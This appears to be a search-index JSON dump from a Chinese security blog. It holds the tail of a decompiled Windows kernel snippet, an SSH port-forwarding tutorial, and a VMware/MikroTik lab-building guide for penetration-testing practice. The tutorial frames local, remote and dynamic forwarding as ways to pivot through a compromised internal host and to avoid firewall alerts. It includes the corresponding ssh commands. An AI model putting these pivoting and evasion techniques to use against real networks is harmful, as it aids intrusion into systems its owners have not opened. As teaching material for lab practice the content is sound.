LABEL_7: v13 = (__int64)v30; goto LABEL_8; } if ( *((_WORD *)v30 + 6) \u0026gt; 1u ) { if ( *(_DWORD *)\u0026amp;stru_1C032C3F8.Length \u0026gt; 5u \u0026amp;\u0026amp; (unsigned __int8)sub_1C00B5068(\u0026amp;stru_1C032C3F8, 0x400000000000i64) ) { v31 = \u0026amp;v25; v30 = \u0026amp;v26; v29 = \u0026amp;v28; v28 = 0x1000000i64; SysEntryGetDispatchTableValues(v10, (__int64)\u0026amp;unk_1C02F466B, v11, v12); } goto LABEL_6; } 参考链接：\nhttps://www.secrss.com/articles/35266\nhttps://mp.weixin.qq.com/s/AcFS0Yn9SDuYxFnzbBqhkQ\nhttps://bbs.pediy.com/thread-269930.htm\n"},{"uri":"https://www.ch35tnut.site/zh-cn/misc/tunnel/application-layer/ssh-tunnel/","title":"SSH隧道","tags":[],"description":"","content":"SSH隧道 SSH提供了三种转发模式：本地端口转发、远程端口转发以及动态端口转发，本文将介绍这三种转发模式的用法。\n一些基本概念 本地主机：SSH客户端所在的主机。\n远程主机：相对于本地主机的概念，在本地主机之外的主机叫远程主机。\nSSH命令行参数解释\n-C:压缩传输，提高传输速度 -f:将ssh转入后台执行 -N:建立静默连接（连接后看不到具体会话） -g:允许远程主机连接本地用于转发的端口 -L:本地端口转发 -R:远程端口转发 本地端口转发 本地端口转发，即将本地端口转发到远程主机上，命令格式：ssh -L \u0026lt;local port\u0026gt;:\u0026lt;remote host\u0026gt;:\u0026lt;remote port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 在SSH Client运行命令ssh -CfNg -L 127.0.0.1:1313:127.0.0.1:1313 root@a.b.c.d ，将127.0.0.1:1313端口转发到SSH Server的127.0.0.1:1313端口上。此时SSH Client访问127.0.0.1:1313的结果跟访问在SSH Server端的127.0.0.1:1313结果一样。\n在SSH Client上\n此时在SSH Client上的ssh会监听127.0.0.1:1313这个端口，该端口的TCP数据通过ssh隧道传输到SSH server上。\n在SSH Server上，先监听127.0.0.1:1313端口，本文监听使用hugo 启动一个server。\n在SSH Client上使用curl 127.0.0.1:1313命令时返回的内容即为SSH Server上127.0.0.1:1313的内容\n同时本地端口转发命令中remote ip不止限制在127.0.0.1上，remote ip可以是任何一个SSH Server能够连接的host，实际上本地端口转发过程中，实际上是把SSH Server当作跳板机，连通SSH Client和SSH Server另外一端的主机，如下：\n|SSH Client| \u0026lt;-------------\u0026gt;|SSH Server| \u0026lt;--------------\u0026gt;|SSH Client不能访问但是SSH Server能访问的主机|\n本地端口转发一般应用场景为在渗透测试过程中控制了目标网络中带有SSH Server的一台机器，通过这台机器做为跳板机来访问内网其他主机上的服务。一定程度上规避防火墙的流量告警（因为ssh流量为加密流量）\n远程端口转发。 远程端口转发即和本地端口转发是相反的概念，本地端口转发是将本地端口转发到远程端口上，连接本地端口即跟连接远程端口一个效果。而远程端口转发即将远程端口转发到本地，使得连接远程端口即跟连接本地端口一样。命令格式：ssh -R \u0026lt;remote port\u0026gt;:\u0026lt;local ip\u0026gt;:\u0026lt;local port\u0026gt; \u0026lt;username\u0026gt;@\u0026lt;SSH hostname\u0026gt;\n举例：\nSSH Client IP:x.x.x.x SSH Server IP:a.b.c.d 本次我们将SSH Client的3389端口转发到SSH Server（公网服务器）上，使得另外一台机器能够通过SSH Server的端口连接到位于局域网的SSH Client的远程桌面。\n在ssh client上运行命令\n此时任何连接SSH Server:9898的请求都会被转发到SSH Client的58989端口上，该端口监听的服务为远程桌面服务。在另外一台电脑（不同于SSH Server和SSH Client）使用远程桌面连接SSH Server:9898\n同本地端口转发一样，远程端口转发命令中的local ip可以是任何一个SSH Client能够连接的host，此时SSH Client被当作跳板机，连通SSH Client另外一端和SSH Server端的主机。\n|SSH Serve能够连通的主机| \u0026lt;--------------\u0026gt; |SSH Client| \u0026lt;--------------\u0026gt; |SSH Client能访问但是SSH Server不能访问的主机|\n远程端口转发应用场景一般是将局域网的某些服务通过SSH隧道暴露在公网上，或者在渗透测试过程中，控制了内网的某台主机，通过远程端口转发，将该主机作为跳板机来访问内网其他服务，因为此时SSH是从内网连接到外网，在流量上没有那么可疑。\n动态端口转发 在本地端口转发和远程端口转发过程中，一次性只能转发一个端口，在某些场景下效率太低了，而动态端口转发没有指定目的端口，相对于前两种来说更灵活。实际上动态端口转发即为SSH实现的SOCKS协议。命令格式:ssh -D port \u0026lt;username\u0026gt;@\u0026lt;SSH host\u0026gt;。\n在SSH Client执行命令即可在SSH Client和SSH Server之间建立socks5隧道，SSH Client可以连接该隧道来传输数据。\n组合利用 在一些情况下可以通过组合上面三种转发来达到意想不到的效果。\n例如，有两台位于互不相通的局域网主机，如果一台想要访问另外一台能够访问的服务时，可以以下面的方式达到目的\n在主机1上执行命令 ssh -CfNg -R 9898:192.168.50.1:22 root\u0026lt;SSH Server\u0026gt; 将主机1的ssh端口转发到公网服务器的9898端口。\n在主机2执行命令ssh -D 12222 -p 9898 \u0026lt;username\u0026gt;@\u0026lt;SSH Server\u0026gt; 此时ssh连接的是主机1，且建立了socks隧道，通过该隧道主机2可以方便的使用主机1能访问而主机2不能直接访问的服务。\n"},{"uri":"https://www.ch35tnut.site/zh-cn/others/vmware-based-implementation-of-small-domain-network-construction/","title":"基于Vmware的小型域网络搭建","tags":[],"description":"","content":"基于Vmware的小型域网络搭建 摘要 在渗透的日常学习过程中经常需要一个内网环境，本篇文章介绍如何使用Vmware和MikroTik搭建简易的二层内网环境。\n网络结构 整个网络分为结构分为三层，第一层模拟外网环境，第二层为DMZ区域，该区域通过边界路由器的端口映射，将第二层网络主机的一些端口映射到边界路由器上对外提供服务，第三层模拟办公网，该层网络为域网络，同时可以控制第二层网络的主机。\n整个网络拓扑图如下：\nIP设置：\n第一层网络为（外网）：192.168.59.0/24\n第二层网络为（DMZ区域）：192.168.72.0/24\n第三层网络为（办公网）：172.16.2.0/24\n路由器IP地址：\n边界路由器：192.168.59.141 | 192.168.72.2\n内网路由器：192.168.72.254 | 172.16.2.254\n网络搭建 网络设置 首先使用VMware的虚拟网络编辑器增加两个网络VMnet2、VMnet3，都勾选仅主机模式，同时取消下面两个勾，如下图：\nVMnet3同理，同时在DHCP设置处设置相应的IP地址和掩码。其中外层网络为nat模式，VMnet2为DMZ区域网络，VMnet3为办公网络\n虚拟机搭建 整个网络在最少情况下一共需要六台虚拟机，分为两台ROS，四台网络中的主机。\nROS从hxxps://mikrotik.com/download下载stable版本的ova格式的镜像，之后导入到VMware中。一共需要导入两次，分别命名为ROS，ROS-1。除了下载镜像之外还需要下载winbox方便对路由器进行设置。\n网络中主机分布：\nDMZ：Ubuntu 2004、windows7\n办公网：Windows server2019、windows7\n创建上述虚拟机，并将DMZ区域的主机的网卡设置为VMnet2，办公网的主机设置为VMnet3.\n将边界路由器ROS网卡设置为net模式和VMnet2模式，内网路由器设置为VMnet2和VMnet3模式。\nIP地址及路由器设置 经历上面的步骤之后，基本的网络拓扑已经搭建完成，接下来需要对网络内的主机和路由器进行设置使得网络中的主机能够相互ping通。\n首先设置两个网络中的主机IP地址\nDMZ：\nWindows7：192.168.72.4/24 网关192.168.72.2 DNS114.114.114.114\nUbuntu ：192.168.72.3/24 网关192.168.72.2 DNS114.\n114.114.114\n办公网：\nWindows server 2019：172.16.2.4/24 网关172.16. 2.254 DNS127.0.0.1\nwindows7：172.16.2.3/24 网关172.16.2.254 DNS172.16.2.4\n至此，两个网络的主机应该可以ping通同一个网络的主机。接下来设置两个ROS的IP地址。\n打开winbox，点击Neighbors按钮，会自动嗅探网络内的存活的路由器，如下图所示。\n上图为边界路由器的IP地址，如果分配了IP地址则可以在浏览器通过IP地址浏览路由器的web界面，在如果没有分配IP地址则通过wibbox使用MAC地址登录\n进入之后，在左侧选项卡会列出路由器拥有的所有网卡接口，点击之后进入到接口详情界面，在里面会列出该接口的一些基本信息，可以通过网卡的MAC分辨该网卡对应在vmware中的网卡，将两个网卡名称分别设置为ether1-wan和ether2-lan，之后在ip-\u0026gt;addresses选项卡中将ether-lan设置为下图。ether1-wan不用设置，因为该网卡网络类型为nat会自动dhcp分配\n之后在IP-\u0026gt;Firewall-\u0026gt;NAT中新建规则，chain：srcnat，out.interface:ether2-lan,action:masquerade\n该规则将使得路由器两边的网络联通。\n参考\nhttps://www.huaweicloud.com/articles/401014315f14d0fb8d5e3f5489693621.html http://www.roszj.com/1692.html http://www.irouteros.com/?p=583\n"},{"uri":"https://www.ch35tnut.site/zh-cn/categories/","title":"Categories","tags":[],"description":"","content":""},{"uri":"https://www.ch35tnut.site/zh-cn/tags/","title":"Tags","tags":[],"description":"","content":""}]